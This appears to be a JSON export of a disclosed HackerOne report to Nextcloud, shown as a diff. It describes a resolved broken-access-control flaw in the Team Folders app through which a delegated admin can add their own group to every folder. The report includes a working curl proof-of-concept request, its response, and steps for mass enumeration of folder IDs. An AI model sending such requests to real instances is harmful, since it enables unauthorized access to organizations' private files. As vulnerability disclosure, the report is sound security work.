@@ -1,0 +1,181 @@
+{
+  "id": 3674940,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjc0OTQw",
+  "url": "https://hackerone.com/reports/3674940",
+  "title": "Critical broken access control: API-only delegated admin can enumerate all Team Folders and grant access to arbitrary groups",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-04-15T10:09:15.892Z",
+  "submitted_at": "2026-04-15T10:09:16.387Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "qloo",
+    "url": "/qloo",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/0budw5gbf5nxjhkid09yvvc9zul0/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-09-17T10:41:04.649Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-17T10:41:04.392Z",
+  "team_member_agreed_on_going_public_at": "2026-09-17T07:42:08.497Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nAn `API/REST only` delegated admin can bypass folder-level authorization and gain access to **any Team Folder** by abusing:\n\n```http\nPOST /index.php/apps/groupfolders/folders/{id}/groups\n```\n\nBecause `folder_id` is predictable (auto-increment), an attacker can **enumerate all Team Folders and mass-assign their own group**, resulting in full access to organization-wide data.\n\n## Affected Endpoint\n\n```http\nPOST /index.php/apps/groupfolders/folders/{id}/groups\n```\n\n## Tested Environment\n\n* Nextcloud Hub 26 Winter (33.0.2)\n* Deployment: Docker (local)\n* Groupfolders app: latest compatible version\n* Workspace app: enabled\n\n## Preconditions\n\n* Team Folders app enabled\n* Workspace app enabled\n* Attacker has `API/REST only` delegated admin privileges\n* Attacker controls a group (e.g. `Product_Dev`)\n\n## Steps to Reproduce\n\n### Single Folder Exploit\n\n1. Log in as an attacker account with `API/REST only` delegated admin privileges\n\n2. Use a proxy tool (e.g. Burp Suite) to intercept a request and obtain:\n   * Session cookie\n   * `requesttoken` (CSRF token)\n\n3. Identify a Team Folder not managed by the attacker (e.g. `Finance`, id=`1`)\n\n4. Send the following request:\n\n```http\nPOST /index.php/apps/groupfolders/folders/1/groups\nHost: <target>\nCookie: <session_cookie>\nrequesttoken: <request_token>\nContent-Type: application/json\n\n{\"group\": \"Product_Dev\"}\n```\n\n5. Observe that the request is accepted and the group is successfully added to the target folder\n\n6. Log in as a user in `Product_Dev` (or refresh mounts)\n\n7. Navigate to Files UI\n\n8. Observe that the `Finance` Team Folder is now visible and accessible\n\n### Mass Exploitation (Full Instance Compromise)\n\n1. Using the same authenticated session (cookie + requesttoken)\n\n2. Enumerate folder IDs (e.g. sequential integers: 1–100)\n\n3. Repeat the request:\n\n```http\nPOST /index.php/apps/groupfolders/folders/{id}/groups\n```\n\n4. Add attacker-controlled group (`Product_Dev`) to each folder\n\n5. Result:\n   * Multiple Team Folders become accessible\n   * Cross-team data exposure achieved\n\n## Proof of Concept\n\nThe following request demonstrates that an `API/REST only` delegated admin can add an arbitrary group to a Team Folder they are not authorized to manage.\n\n### PoC Request\n\n```bash\ncurl -X POST \"http://{{TARGET_HOST}}/index.php/apps/groupfolders/folders/1/groups\" \\\n     -H \"Host: {{TARGET_HOST}}\" \\\n     -H \"Content-Type: application/json\" \\\n     -H \"requesttoken: ql6Eh0++DgBt4UI8eyQ/p2u5wAQQsVZhNd3+odQtip0=:*******\" \\\n     -H \"X-Requested-With: XMLHttpRequest\" \\\n     -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36\" \\\n     -H \"Accept: application/json, text/plain, */*\" \\\n     -H \"Origin: http://{{TARGET_HOST}}\" \\\n     -H \"Cookie: nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; oc_sessionPassphrase=*******; ocla11e1zi8v=*******; nc_username=Product_Tester_A; nc_token=*******; nc_session_id=*******\" \\\n     --data-raw '{\"group\":\"Product_Dev\"}'\n```\n\nResponse:\n\n```json\n{\n    \"ocs\": {\n        \"meta\": {\n            \"status\": \"ok\",\n            \"statuscode\": 100,\n            \"message\": \"OK\",\n            \"totalitems\": \"\",\n            \"itemsperpage\": \"\"\n        },\n        \"data\": {\n            \"success\": true,\n            \"folder\": {\n                \"id\": 1,\n                \"mount_point\": \"Finance\",\n                \"quota\": -3,\n                \"acl\": false,\n                \"acl_default_no_permission\": false,\n                \"size\": 7,\n                \"groups\": {\n                    \"Finance\": 31,\n                    \"Product_Dev\": 31\n                },\n                \"group_details\": {\n                    \"Finance\": {\n                        \"displayName\": \"Finance\",\n                        \"permissions\": 31,\n                        \"type\": \"group\"\n                    },\n                    \"Product_Dev\": {\n                        \"displayName\": \"Product_Dev\",\n                        \"permissions\": 31,\n                        \"type\": \"group\"\n                    }\n                },\n                \"manage\": []\n            }\n        }\n    }\n}\n```\n#### **Evidence (Screenshots)**\n\nThe following screenshots are provided as attachments:\n\n1. **Initial Team Folders configuration**\n\n   * Shows that the target folder (e.g. `Finance`) is **not assigned** to the attacker-controlled group (`Product_Dev`)\n\n2. **Initial Files UI view (Product_Tester_A)**\n\n   * Shows that the attacker user cannot see the target Team Folder\n\n3. **Team Folders configuration after exploitation**\n\n   * Shows that `Product_Dev` has been successfully added to the target Team Folder\n\n4. **Files UI view after exploitation (Product_Tester_A)**\n\n   * Shows that the previously unauthorized Team Folder is now visible and accessible\n\n## Expected Result\n\nThe API should return `403 Forbidden` unless the caller is authorized to manage the specific Team Folder.\n\n## Actual Result\n\nThe API allows modification of folder access based solely on API-level privileges, without enforcing folder-level authorization.\n\n## Additional Notes\n\n* Folder IDs are auto-increment, making enumeration trivial\n* No rate limiting or authorization checks prevent mass exploitation\n* The issue affects write endpoints responsible for access control\n\n## Impact\n\nThis vulnerability allows an attacker to:\n\n* Enumerate all existing Team Folder IDs\n* Add an attacker-controlled group to each folder\n* Gain access to **all Team Folders across the instance**\n* Read, download, and interact with sensitive files\n\nThis leads to:\n\n* Organization-wide data exposure (Finance, HR, Legal, Engineering, etc.)\n* Complete breakdown of Team Folder isolation\n* Privilege escalation from limited delegated admin → global data access\n\n## Attack Scenario\n\nAn attacker with limited delegated admin privileges can:\n\n1. Enumerate all Team Folder IDs\n2. Add their own group to each folder\n3. Instantly gain access to all organizational data\n\nExample:\n\n* Access Finance → download financial reports\n* Access HR → retrieve employee data\n* Access Engineering → access source code or internal documents\n\nThis enables **large-scale data exfiltration with a single low-privileged account**.",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5738108,
+      "file_name": "team_folders_settings2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/167lk8zg9rvnir4m8cb989d7thhk?response-content-disposition=attachment%3B%20filename%3D%22team_folders_settings2.png%22%3B%20filename%2A%3DUTF-8%27%27team_folders_settings2.png&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ32XAKOME%2F20260917%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260917T125648Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEGQaCXVzLXdlc3QtMiJHMEUCIQDmue%2Fr0%2FNo2ahTFaWFV4D4T1RGG%2FF6FoT3yJ7ilOFPcAIga2L9UecKxyYULdLnmX%2FIKXkkrk%2FGQ2TqHJQdfpLtwrsqsQUILRADGgwwMTM2MTkyNzQ4NDkiDMsomZSvIipM9beg%2BiqOBfLvUZ7F00mN5ZXH1S1FtimLoZIktq%2F9UiFBZjtugYJxjSV%2BHwKyyGAw%2FxzakGrN5T%2F5u5OnzmeOXaoQ5eWkIifh8U42vD%2BKAfkHl6LRsJ%2BlxPXdcJNJZutk09QZeqw3VMRORiQXwcMiw7uKzkEl4DgIcm4fUpKNArzE%2FMokIAxOyDaUV%2FhaP1bbrJMMJZtjEvWxuzGacHxGPNI2RQUi8ntWggsbDg6Yb3YOUYMSo7IL37WX0Ytd7FXHzfnaWxGJa7BwBhzS%2BnkuqwE80FuwH%2BJDHFMF14ObSueY0y%2FrYfxpyxidBLg3h7yzyLtPqlGB9q2quk%2FLvv%2FSSK55QcunnOPWVw7xGkCRQTp%2Bqh11tN1HUY3KK%2BthYbfJaeUp1tgMHLkUz3ewhjMhhS6GTkwEBiV%2BBLsL1xItuPPPNC3WODrNTJwUTGFR%2BxCURyj4km82Kv7zgyNWfN81PGlLvVpCs3AwJzNUK7RxxRn%2F6OTcZxKV7EQidilknK4vUK34dHwCOFi50zdV%2Ftf08D41hddyTV8YM2PfhehiZEUm9orDFXzqvwTGzlSB7tt%2FrUAxxsUa%2B%2Bti9711hytQiPA75YbVhk1p7tb6WAbefHYWpmsojMCc1CCxioqG5KvIU89%2F5Sol8iHInM7mpwCrvgmmg5FVtQADMXXLqXEXxGB2t%2FLFP5ddw%2BLqXFaQsME%2FmU4r0V3HqYgliHhT4c%2BYJo9va%2BdCxqbJ9DrahzhD7wh17JOqvLwMW305ZdAvuURoMdbBmtblByUVj4bF3qIIQJ2puUTq97pSSIUI9jKY3T5IJghkB7THODncCBmQO4FkcYUDf%2FgB8sFb1EE12cxd92RS%2FAsOWpcXN6%2B8Br64LgiurADT3jD4qq%2FVBjqxAWChGm501UxWdnd%2BpYrYiBag%2BbqSlF00DE1NK0g1KgWN%2BhdFTtTpjvjO%2BXk2YNzTC58vEGtmpFcibftv54PRlVyRi8%2BOODiy1tCXB%2Fwm54W6bAmd696dRBZBIHHQroxOiyrypNdE847yRIOq0aR%2FI25T3WTko%2BpF%2B6%2BbIMwdYfI83Nb%2BBf7xTu6VBdXtw%2Fj3mID%2F8qZPkvAkPG%2By4%2BQZqA6LX5qloUrNxt%2B5ri8N726aGA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0bd4213e4b23345e7602fe92fe1c7664f18eca14306c01e1aeed6c38bd78b400",
+      "file_size": 206178,
+      "type": "image/jpeg",
+      "moderated": false
+    },
+    {
+      "id": 5738111,
+      "file_name": "team_folders_for_product_tester_a_2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/lt1pblcpjpao5xx93329xxqjfgcr?response-content-disposition=attachment%3B%20filename%3D%22team_folders_for_product_tester_a_2.png%22%3B%20filename%2A%3DUTF-8%27%27team_folders_for_product_tester_a_2.png&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ32XAKOME%2F20260917%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260917T125648Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEGQaCXVzLXdlc3QtMiJHMEUCIQDmue%2Fr0%2FNo2ahTFaWFV4D4T1RGG%2FF6FoT3yJ7ilOFPcAIga2L9UecKxyYULdLnmX%2FIKXkkrk%2FGQ2TqHJQdfpLtwrsqsQUILRADGgwwMTM2MTkyNzQ4NDkiDMsomZSvIipM9beg%2BiqOBfLvUZ7F00mN5ZXH1S1FtimLoZIktq%2F9UiFBZjtugYJxjSV%2BHwKyyGAw%2FxzakGrN5T%2F5u5OnzmeOXaoQ5eWkIifh8U42vD%2BKAfkHl6LRsJ%2BlxPXdcJNJZutk09QZeqw3VMRORiQXwcMiw7uKzkEl4DgIcm4fUpKNArzE%2FMokIAxOyDaUV%2FhaP1bbrJMMJZtjEvWxuzGacHxGPNI2RQUi8ntWggsbDg6Yb3YOUYMSo7IL37WX0Ytd7FXHzfnaWxGJa7BwBhzS%2BnkuqwE80FuwH%2BJDHFMF14ObSueY0y%2FrYfxpyxidBLg3h7yzyLtPqlGB9q2quk%2FLvv%2FSSK55QcunnOPWVw7xGkCRQTp%2Bqh11tN1HUY3KK%2BthYbfJaeUp1tgMHLkUz3ewhjMhhS6GTkwEBiV%2BBLsL1xItuPPPNC3WODrNTJwUTGFR%2BxCURyj4km82Kv7zgyNWfN81PGlLvVpCs3AwJzNUK7RxxRn%2F6OTcZxKV7EQidilknK4vUK34dHwCOFi50zdV%2Ftf08D41hddyTV8YM2PfhehiZEUm9orDFXzqvwTGzlSB7tt%2FrUAxxsUa%2B%2Bti9711hytQiPA75YbVhk1p7tb6WAbefHYWpmsojMCc1CCxioqG5KvIU89%2F5Sol8iHInM7mpwCrvgmmg5FVtQADMXXLqXEXxGB2t%2FLFP5ddw%2BLqXFaQsME%2FmU4r0V3HqYgliHhT4c%2BYJo9va%2BdCxqbJ9DrahzhD7wh17JOqvLwMW305ZdAvuURoMdbBmtblByUVj4bF3qIIQJ2puUTq97pSSIUI9jKY3T5IJghkB7THODncCBmQO4FkcYUDf%2FgB8sFb1EE12cxd92RS%2FAsOWpcXN6%2B8Br64LgiurADT3jD4qq%2FVBjqxAWChGm501UxWdnd%2BpYrYiBag%2BbqSlF00DE1NK0g1KgWN%2BhdFTtTpjvjO%2BXk2YNzTC58vEGtmpFcibftv54PRlVyRi8%2BOODiy1tCXB%2Fwm54W6bAmd696dRBZBIHHQroxOiyrypNdE847yRIOq0aR%2FI25T3WTko%2BpF%2B6%2BbIMwdYfI83Nb%2BBf7xTu6VBdXtw%2Fj3mID%2F8qZPkvAkPG%2By4%2BQZqA6LX5qloUrNxt%2B5ri8N726aGA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=74d54b2dd14c67080ff3de1c950fc11fee7dcfcf5f89ddc2b231e945dd91d051",
+      "file_size": 192966,
+      "type": "image/jpeg",
+      "moderated": false
+    },
+    {
+      "id": 5738112,
+      "file_name": "team_folders_for_product_tester_a.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hlw6wq65fxn0v3btx71ute7ivpry?response-content-disposition=attachment%3B%20filename%3D%22team_folders_for_product_tester_a.png%22%3B%20filename%2A%3DUTF-8%27%27team_folders_for_product_tester_a.png&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ32XAKOME%2F20260917%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260917T125648Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEGQaCXVzLXdlc3QtMiJHMEUCIQDmue%2Fr0%2FNo2ahTFaWFV4D4T1RGG%2FF6FoT3yJ7ilOFPcAIga2L9UecKxyYULdLnmX%2FIKXkkrk%2FGQ2TqHJQdfpLtwrsqsQUILRADGgwwMTM2MTkyNzQ4NDkiDMsomZSvIipM9beg%2BiqOBfLvUZ7F00mN5ZXH1S1FtimLoZIktq%2F9UiFBZjtugYJxjSV%2BHwKyyGAw%2FxzakGrN5T%2F5u5OnzmeOXaoQ5eWkIifh8U42vD%2BKAfkHl6LRsJ%2BlxPXdcJNJZutk09QZeqw3VMRORiQXwcMiw7uKzkEl4DgIcm4fUpKNArzE%2FMokIAxOyDaUV%2FhaP1bbrJMMJZtjEvWxuzGacHxGPNI2RQUi8ntWggsbDg6Yb3YOUYMSo7IL37WX0Ytd7FXHzfnaWxGJa7BwBhzS%2BnkuqwE80FuwH%2BJDHFMF14ObSueY0y%2FrYfxpyxidBLg3h7yzyLtPqlGB9q2quk%2FLvv%2FSSK55QcunnOPWVw7xGkCRQTp%2Bqh11tN1HUY3KK%2BthYbfJaeUp1tgMHLkUz3ewhjMhhS6GTkwEBiV%2BBLsL1xItuPPPNC3WODrNTJwUTGFR%2BxCURyj4km82Kv7zgyNWfN81PGlLvVpCs3AwJzNUK7RxxRn%2F6OTcZxKV7EQidilknK4vUK34dHwCOFi50zdV%2Ftf08D41hddyTV8YM2PfhehiZEUm9orDFXzqvwTGzlSB7tt%2FrUAxxsUa%2B%2Bti9711hytQiPA75YbVhk1p7tb6WAbefHYWpmsojMCc1CCxioqG5KvIU89%2F5Sol8iHInM7mpwCrvgmmg5FVtQADMXXLqXEXxGB2t%2FLFP5ddw%2BLqXFaQsME%2FmU4r0V3HqYgliHhT4c%2BYJo9va%2BdCxqbJ9DrahzhD7wh17JOqvLwMW305ZdAvuURoMdbBmtblByUVj4bF3qIIQJ2puUTq97pSSIUI9jKY3T5IJghkB7THODncCBmQO4FkcYUDf%2FgB8sFb1EE12cxd92RS%2FAsOWpcXN6%2B8Br64LgiurADT3jD4qq%2FVBjqxAWChGm501UxWdnd%2BpYrYiBag%2BbqSlF00DE1NK0g1KgWN%2BhdFTtTpjvjO%2BXk2YNzTC58vEGtmpFcibftv54PRlVyRi8%2BOODiy1tCXB%2Fwm54W6bAmd696dRBZBIHHQroxOiyrypNdE847yRIOq0aR%2FI25T3WTko%2BpF%2B6%2BbIMwdYfI83Nb%2BBf7xTu6VBdXtw%2Fj3mID%2F8qZPkvAkPG%2By4%2BQZqA6LX5qloUrNxt%2B5ri8N726aGA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e2009d15eeed627130fc5fa6c64952f79c9e92a8992d7c1ae62ed21ef1046b92",
+      "file_size": 118752,
+      "type": "image/jpeg",
+      "moderated": false
+    },
+    {
+      "id": 5738114,
+      "file_name": "team_folders_settings1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zehkwtgl18b72dnfzj9e570s6su4?response-content-disposition=attachment%3B%20filename%3D%22team_folders_settings1.png%22%3B%20filename%2A%3DUTF-8%27%27team_folders_settings1.png&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ32XAKOME%2F20260917%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260917T125648Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEGQaCXVzLXdlc3QtMiJHMEUCIQDmue%2Fr0%2FNo2ahTFaWFV4D4T1RGG%2FF6FoT3yJ7ilOFPcAIga2L9UecKxyYULdLnmX%2FIKXkkrk%2FGQ2TqHJQdfpLtwrsqsQUILRADGgwwMTM2MTkyNzQ4NDkiDMsomZSvIipM9beg%2BiqOBfLvUZ7F00mN5ZXH1S1FtimLoZIktq%2F9UiFBZjtugYJxjSV%2BHwKyyGAw%2FxzakGrN5T%2F5u5OnzmeOXaoQ5eWkIifh8U42vD%2BKAfkHl6LRsJ%2BlxPXdcJNJZutk09QZeqw3VMRORiQXwcMiw7uKzkEl4DgIcm4fUpKNArzE%2FMokIAxOyDaUV%2FhaP1bbrJMMJZtjEvWxuzGacHxGPNI2RQUi8ntWggsbDg6Yb3YOUYMSo7IL37WX0Ytd7FXHzfnaWxGJa7BwBhzS%2BnkuqwE80FuwH%2BJDHFMF14ObSueY0y%2FrYfxpyxidBLg3h7yzyLtPqlGB9q2quk%2FLvv%2FSSK55QcunnOPWVw7xGkCRQTp%2Bqh11tN1HUY3KK%2BthYbfJaeUp1tgMHLkUz3ewhjMhhS6GTkwEBiV%2BBLsL1xItuPPPNC3WODrNTJwUTGFR%2BxCURyj4km82Kv7zgyNWfN81PGlLvVpCs3AwJzNUK7RxxRn%2F6OTcZxKV7EQidilknK4vUK34dHwCOFi50zdV%2Ftf08D41hddyTV8YM2PfhehiZEUm9orDFXzqvwTGzlSB7tt%2FrUAxxsUa%2B%2Bti9711hytQiPA75YbVhk1p7tb6WAbefHYWpmsojMCc1CCxioqG5KvIU89%2F5Sol8iHInM7mpwCrvgmmg5FVtQADMXXLqXEXxGB2t%2FLFP5ddw%2BLqXFaQsME%2FmU4r0V3HqYgliHhT4c%2BYJo9va%2BdCxqbJ9DrahzhD7wh17JOqvLwMW305ZdAvuURoMdbBmtblByUVj4bF3qIIQJ2puUTq97pSSIUI9jKY3T5IJghkB7THODncCBmQO4FkcYUDf%2FgB8sFb1EE12cxd92RS%2FAsOWpcXN6%2B8Br64LgiurADT3jD4qq%2FVBjqxAWChGm501UxWdnd%2BpYrYiBag%2BbqSlF00DE1NK0g1KgWN%2BhdFTtTpjvjO%2BXk2YNzTC58vEGtmpFcibftv54PRlVyRi8%2BOODiy1tCXB%2Fwm54W6bAmd696dRBZBIHHQroxOiyrypNdE847yRIOq0aR%2FI25T3WTko%2BpF%2B6%2BbIMwdYfI83Nb%2BBf7xTu6VBdXtw%2Fj3mID%2F8qZPkvAkPG%2By4%2BQZqA6LX5qloUrNxt%2B5ri8N726aGA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f5cde67edd7276d0b1c7785cf4af45bb52c4554e5a066e0d6f3f1fa281e69cb2",
+      "file_size": 181079,
+      "type": "image/jpeg",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-10-17T07:42:08.878Z",
+  "allow_singular_disclosure_after": 2573120.241841883,
+  "singular_disclosure_allowed": false,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "medium",
+    "score": 6.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 68207,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/groupfolders",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 882397,
+      "category": "team",
+      "content": "https://github.com/nextcloud/security-advisories/security/advisories/GHSA-9mjh-89xm-hcqw",
+      "updated_at": "2026-07-29T22:24:51.223Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 4338232,
+        "username": "danielkb",
+        "name": "Daniel",
+        "bio": "",
+        "cleared": false,
+        "verified": true,
+        "website": "https://nextcloud.com/",
+        "location": "",
+        "created_at": "2026-01-25T14:11:37.045Z",
+        "url": "https://hackerone.com/danielkb",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
